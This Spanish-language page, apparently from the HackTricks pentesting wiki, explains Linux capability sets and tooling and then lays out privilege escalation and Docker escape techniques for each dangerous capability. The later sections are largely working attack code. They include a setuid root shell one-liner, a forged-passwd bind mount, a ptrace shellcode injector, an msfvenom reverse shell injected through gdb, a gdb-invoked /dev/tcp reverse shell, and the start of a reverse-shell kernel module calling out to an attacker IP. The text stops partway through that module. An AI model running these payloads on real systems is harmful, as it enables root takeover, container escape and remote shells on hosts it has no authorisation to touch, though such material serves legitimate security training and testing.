# Capacidades de Linux

{{#include ../../banners/hacktricks-training.md}}


## Capacidades de Linux

Las capacidades de Linux dividen los **privilegios de root en unidades más pequeñas y diferenciadas**, permitiendo que los procesos tengan un subconjunto de privilegios. Esto minimiza los riesgos al no conceder privilegios completos de root de forma innecesaria.

### El problema:

- Los usuarios normales tienen permisos limitados, lo que afecta a tareas como abrir un socket de red, algo que requiere acceso de root.

### Conjuntos de capacidades:

1. **Heredado (CapInh)**:

- **Propósito**: Determina las capacidades transmitidas desde el proceso padre.
- **Funcionalidad**: Cuando se crea un proceso nuevo, hereda las capacidades de su padre en este conjunto. Es útil para mantener ciertos privilegios durante la creación de procesos.
- **Restricciones**: Un proceso no puede obtener capacidades que su padre no poseyera.

2. **Efectivo (CapEff)**:

- **Propósito**: Representa las capacidades reales que un proceso está utilizando en un momento determinado.
- **Funcionalidad**: Es el conjunto de capacidades que el kernel comprueba para conceder permisos para diversas operaciones. En el caso de los archivos, este conjunto puede ser un indicador que señala si deben considerarse efectivas las capacidades permitidas del archivo.
- **Importancia**: El conjunto efectivo es crucial para las comprobaciones inmediatas de privilegios, ya que actúa como el conjunto activo de capacidades que un proceso puede utilizar.

3. **Permitido (CapPrm)**:

- **Propósito**: Define el conjunto máximo de capacidades que un proceso puede poseer.
- **Funcionalidad**: Un proceso puede elevar una capacidad del conjunto permitido a su conjunto efectivo, lo que le permite utilizarla. También puede eliminar capacidades de su conjunto permitido.
- **Límite**: Actúa como un límite superior para las capacidades que un proceso puede tener, garantizando que no supere su ámbito de privilegios predefinido.

4. **Delimitador (CapBnd)**:

- **Propósito**: Establece un límite máximo para las capacidades que un proceso puede adquirir durante su ciclo de vida.
- **Funcionalidad**: Aunque un proceso tenga una determinada capacidad en su conjunto heredable o permitido, no puede adquirirla a menos que también esté en el conjunto delimitador.
- **Caso de uso**: Este conjunto resulta especialmente útil para restringir el potencial de escalada de privilegios de un proceso, añadiendo una capa adicional de seguridad.

5. **Ambiental (CapAmb)**:
- **Propósito**: Permite mantener ciertas capacidades durante una llamada al sistema `execve`, que normalmente provocaría un restablecimiento completo de las capacidades del proceso.
- **Funcionalidad**: Garantiza que los programas que no son SUID y que no tienen capacidades de archivo asociadas puedan conservar determinados privilegios.
- **Restricciones**: Las capacidades de este conjunto están sujetas a las restricciones de los conjuntos heredable y permitido, garantizando que no superen los privilegios permitidos del proceso.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Para obtener más información, consulta:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capacidades de Processes & Binaries

### Capacidades de Processes

Para ver las capacidades de un proceso concreto, utiliza el archivo **status** del directorio /proc. Como proporciona más detalles, limitemos la información únicamente a la relacionada con las capacidades de Linux.\
Ten en cuenta que, para todos los procesos en ejecución, la información de las capacidades se mantiene por thread; para los binarios del sistema de archivos, se almacena en atributos extendidos.

Puedes encontrar las capacidades definidas en /usr/include/linux/capability.h

Puedes encontrar las capacidades del proceso actual ejecutando `cat /proc/self/status` o `capsh --print`, y las de otros usuarios en `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Este comando debería devolver 5 líneas en la mayoría de los sistemas.

- CapInh = Capabilities heredadas
- CapPrm = Capabilities permitidas
- CapEff = Capabilities efectivas
- CapBnd = Conjunto limitador
- CapAmb = Conjunto de capabilities Ambient
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Estos números hexadecimales no tienen sentido. Usando la utilidad capsh podemos decodificarlos para obtener el nombre de las capabilities.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Comprobemos ahora las **capabilities** utilizadas por `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Aunque esto funciona, existe otra forma más sencilla. Para ver las capabilities de un proceso en ejecución, simplemente usa la herramienta **getpcaps** seguida de su ID de proceso (PID). También puedes proporcionar una lista de IDs de proceso.
```bash
getpcaps 1234
```
Comprobemos aquí las capabilities de `tcpdump` después de haber otorgado al binario suficientes capabilities (`cap_net_admin` y `cap_net_raw`) para capturar el tráfico de red (_tcpdump se está ejecutando en el proceso 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Como puedes ver, las capabilities proporcionadas corresponden a los resultados de las 2 formas de obtener las capabilities de un binario.\
La herramienta _getpcaps_ utiliza la llamada al sistema **capget()** para consultar las capabilities disponibles para un thread concreto. Esta llamada al sistema solo necesita proporcionar el PID para obtener más información.

### Capabilities de los binarios

Los binarios pueden tener capabilities que se pueden utilizar durante su ejecución. Por ejemplo, es muy común encontrar el binario `ping` con la capability `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Puedes **buscar binarios con capabilities** usando:
```bash
getcap -r / 2>/dev/null
```
### Eliminando capabilities con capsh

Si eliminamos las capabilities CAP*NET_RAW para \_ping*, la utilidad ping ya no debería funcionar.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Además de la salida del propio _capsh_, el propio comando _tcpdump_ también debería generar un error.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

El error muestra claramente que el comando ping no tiene permitido abrir un socket ICMP. Ahora sabemos con certeza que esto funciona como se esperaba.

### Eliminar Capabilities

Puedes eliminar las capabilities de un binario con
```bash
setcap -r </path/to/binary>
```
## Capacidades de usuario

Al parecer, **también es posible asignar capabilities a los usuarios**. Esto probablemente significa que cada proceso ejecutado por el usuario podrá utilizar las capabilities del usuario.\
Según [esto](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [esto ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)y [esto ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), es necesario configurar algunos archivos nuevos para otorgar determinadas capabilities a un usuario, pero el archivo que asigna las capabilities a cada usuario será `/etc/security/capability.conf`.\
Ejemplo de archivo:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capacidades del entorno

Compilando el siguiente programa es posible **iniciar un shell de bash dentro de un entorno que proporciona capacidades**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Dentro de **bash ejecutado por el binario ambient compilado** es posible observar las **nuevas capabilities** (un usuario normal no tendrá ninguna capability en la sección "current").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Solo puedes añadir capabilities que estén presentes tanto en los conjuntos permitted como inheritable.

### Binarios capability-aware/Capability-dumb

Los **binarios capability-aware no utilizarán las nuevas capabilities** proporcionadas por el entorno; sin embargo, los **binarios capability-dumb sí las utilizarán**, ya que no las rechazarán. Esto hace que los binarios capability-dumb sean vulnerables dentro de un entorno especial que concede capabilities a los binarios.

## Capabilities de los servicios

De forma predeterminada, un **servicio ejecutándose como root tendrá asignadas todas las capabilities**, y en algunas ocasiones esto puede ser peligroso.\
Por lo tanto, un archivo de **configuración del servicio** permite **especificar** las **capabilities** que quieres que tenga, **y el** **usuario** que debería ejecutar el servicio para evitar ejecutar un servicio con privilegios innecesarios:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities en Docker Containers

Por defecto, Docker asigna algunas capabilities a los containers. Es muy fácil comprobar cuáles son ejecutando:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Las capabilities son útiles cuando **quieres restringir tus propios procesos después de realizar operaciones privilegiadas** (por ejemplo, después de configurar chroot y vincularte a un socket). Sin embargo, pueden explotarse pasando comandos o argumentos maliciosos que después se ejecutan como root.

Puedes forzar capabilities en los programas usando `setcap` y consultarlas usando `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
El `+ep` significa que estás añadiendo la capacidad (“-” la eliminaría) como Effective y Permitted.

Para identificar programas en un sistema o carpeta con capacidades:
```bash
getcap -r / 2>/dev/null
```
### Ejemplo de explotación

En el siguiente ejemplo, el binario `/usr/bin/python2.6` es vulnerable a privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capacidades** necesarias para que `tcpdump` **permita a cualquier usuario capturar paquetes**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### El caso especial de las capabilities "vacías"

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): Ten en cuenta que se pueden asignar conjuntos de capabilities vacíos a un archivo de programa y, por lo tanto, es posible crear un programa set-user-ID-root que cambie el set-user-ID efectivo y guardado del proceso que ejecuta el programa a 0, pero que no otorgue ninguna capability a ese proceso. O, dicho simplemente, si tienes un binary que:

1. no pertenece a root
2. no tiene establecidos los bits `SUID`/`SGID`
3. tiene un conjunto de capabilities vacío (por ejemplo: `getcap myelf` devuelve `myelf =ep`)

entonces **ese binary se ejecutará como root**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** es una capability de Linux muy potente, a menudo equiparada a un nivel casi root debido a sus amplios **privilegios administrativos**, como montar dispositivos o manipular características del kernel. Aunque es indispensable para los containers que simulan sistemas completos, **`CAP_SYS_ADMIN` plantea importantes desafíos de seguridad**, especialmente en entornos containerizados, debido a su potencial para la escalada de privilegios y el compromiso del sistema. Por lo tanto, su uso requiere evaluaciones de seguridad rigurosas y una gestión cuidadosa, con una fuerte preferencia por eliminar esta capability en containers específicos para aplicaciones, con el fin de cumplir el **principio de mínimo privilegio** y minimizar la superficie de ataque.

**Ejemplo con binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Usando Python puedes montar un archivo _passwd_ modificado sobre el archivo _passwd_ real:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Y finalmente, **mount** el archivo `passwd` modificado en `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Y podrás hacer **`su` como root** usando la contraseña "password".

**Ejemplo con entorno (Docker breakout)**

Puedes comprobar las capabilities habilitadas dentro del contenedor de Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro de la salida anterior puedes ver que la capability SYS_ADMIN está habilitada.

- **Mount**

Esto permite al contenedor de Docker **montar el disco del host y acceder a él libremente**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Acceso completo**

En el método anterior logramos acceder al disco del host de Docker.\
En caso de que encuentres que el host está ejecutando un servidor **ssh**, podrías **crear un usuario dentro del disco del host de Docker** y acceder a él mediante SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Esto significa que puedes escapar del contenedor inyectando un shellcode dentro de algún proceso en ejecución dentro del host.** Para acceder a los procesos en ejecución dentro del host, el contenedor debe ejecutarse al menos con **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** otorga la capacidad de utilizar las funcionalidades de depuración y tracing de llamadas al sistema proporcionadas por `ptrace(2)` y llamadas de conexión entre memorias, como `process_vm_readv(2)` y `process_vm_writev(2)`. Aunque es potente para fines de diagnóstico y monitorización, si `CAP_SYS_PTRACE` está habilitado sin medidas restrictivas, como un filtro seccomp en `ptrace(2)`, puede debilitar significativamente la seguridad del sistema. En concreto, puede explotarse para eludir otras restricciones de seguridad, especialmente las impuestas por seccomp, como demuestran [proofs of concept (PoC) como este](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Ejemplo con binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Ejemplo con binario**

`gdb` con la capability `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Crea un shellcode con msfvenom para inyectarlo en memoria mediante gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Depura un proceso root con gdb y copia y pega las líneas de gdb generadas previamente:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Ejemplo con entorno (Docker breakout) - Otro abuso de gdb**

Si **GDB** está instalado (o puedes instalarlo, por ejemplo, con `apk add gdb` o `apt install gdb`), puedes **depurar un proceso desde el host** y hacer que llame a la función `system`. (Esta técnica también requiere la capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
No podrás ver la salida del comando ejecutado, pero será ejecutado por ese proceso (así que obtén una rev shell).

> [!WARNING]
> Si obtienes el error "No symbol "system" in current context.", revisa el ejemplo anterior sobre cómo cargar un shellcode en un programa mediante gdb.

**Example with environment (Docker breakout) - Shellcode Injection**

Puedes comprobar las capacidades habilitadas dentro del contenedor de Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Lista los **procesos** ejecutándose en el **host** `ps -eaf`

1. Obtén la **arquitectura** `uname -m`
2. Encuentra un **shellcode** para la arquitectura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Encuentra un **programa** para **inyectar** el **shellcode** en la memoria de un proceso ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modifica** el **shellcode** dentro del programa y **compílalo** `gcc inject.c -o inject`
5. **Inyéctalo** y obtén tu **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** permite a un proceso **cargar y descargar módulos del kernel (las llamadas al sistema `init_module(2)`, `finit_module(2)` y `delete_module(2)`)**, proporcionando acceso directo a las operaciones principales del kernel. Esta capability presenta riesgos críticos de seguridad, ya que permite la escalada de privilegios y el compromiso total del sistema al permitir modificaciones del kernel, evadiendo así todos los mecanismos de seguridad de Linux, incluidos los Linux Security Modules y el aislamiento de contenedores.
**Esto significa que puedes** **insertar/eliminar módulos del kernel en/desde el kernel de la máquina host.**

**Ejemplo con un binario**

En el siguiente ejemplo, el binario **`python`** tiene esta capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Por defecto, el comando **`modprobe`** busca archivos de lista de dependencias y de mapeo en el directorio **`/lib/modules/$(uname -r)`**.\
Para abusar de esto, creemos una carpeta **lib/modules** falsa:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Luego **compila el módulo del kernel que puedes encontrar 2 ejemplos más abajo y cópialo** a esta carpeta:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Finalmente, ejecuta el código Python necesario para cargar este módulo del kernel:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Ejemplo 2 con binario**

En el siguiente ejemplo, el binario **`kmod`** tiene esta capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Lo que significa que es posible usar el comando **`insmod`** para insertar un módulo del kernel. Sigue el siguiente ejemplo para obtener un **reverse shell** abusando de este privilegio.

**Ejemplo con entorno (Docker breakout)**

Puedes comprobar las capacidades habilitadas dentro del contenedor de Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro de la salida anterior puedes ver que la capability **SYS_MODULE** está habilitada.

**Crea** el **kernel module** que va a ejecutar un reverse shell y el **Makefile** para **compilarlo**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
